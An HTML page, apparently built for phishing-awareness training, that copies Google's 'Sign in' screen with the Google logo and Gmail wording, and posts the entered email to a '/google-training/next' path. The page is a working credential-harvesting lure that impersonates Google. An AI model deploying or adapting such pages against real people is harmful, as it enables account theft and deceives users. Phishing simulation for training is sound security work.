<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in - Google Accounts</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen w-full bg-black flex flex-col items-center justify-center px-6 py-10">

  <!-- Card -->
  <div class="w-full max-w-4xl bg-[#1e1f20] rounded-3xl px-14 py-14">
    <div class="flex flex-col md:flex-row md:items-start gap-16">

      <!-- Left -->
      <div class="flex-1 max-w-xs">
        <svg width="44" height="44" viewBox="0 0 48 48" class="mb-6">
          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.9-2.26 5.36-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
        </svg>
        <h1 class="text-white text-4xl font-normal mb-4">Sign in</h1>
        <p class="text-gray-300 text-sm leading-relaxed">
          with your Google Account to continue to Gmail. This account will be available to other Google apps in the browser.
        </p>
      </div>

      <!-- Right -->
      <div class="flex-1">
        <form id="signinForm" class="flex flex-col" method="POST" action="/google-training/next">
          <div class="relative">
            <label class="absolute -top-2 left-3 bg-[#1e1f20] px-1 text-xs text-[#8ab4f8]">Email or phone</label>
            <input
              type="text"
              name="identifier"
              id="identifier"
              class="w-full bg-transparent border-2 border-[#8ab4f8] rounded-md px-3 py-3.5 text-base text-white focus:outline-none"
            />
          </div>

          <a href="#" class="text-[#8ab4f8] text-sm font-medium mt-3 w-fit">Forgot email?</a>

          <p class="text-gray-300 text-sm mt-10 leading-relaxed">
            Not your computer? Use Guest mode to sign in privately.
            <a href="#" class="text-[#8ab4f8] hover:underline">Learn more about using Guest mode</a>
          </p>

          <div class="flex items-center justify-end gap-8 mt-14">
            <a href="/signup" class="text-[#8ab4f8] text-sm font-medium">Create account</a>
            <button
              type="submit"
              class="bg-[#a8c7fa] hover:bg-[#c2dafe] text-[#062e6f] text-sm font-medium rounded-full px-6 py-2.5 transition"
            >
              Next
            </button>
          </div>
        </form>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <div class="w-full max-w-4xl flex items-center justify-between px-2 mt-4">
    <div class="flex items-center gap-1 text-gray-400 text-sm cursor-pointer">
      English (United States)
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
    </div>
    <div class="flex items-center gap-6 text-gray-400 text-sm">
      <a href="#" class="hover:text-gray-200">Help</a>
      <a href="#" class="hover:text-gray-200">Privacy</a>
      <a href="#" class="hover:text-gray-200">Terms</a>
    </div>
  </div>

</body>
</html>
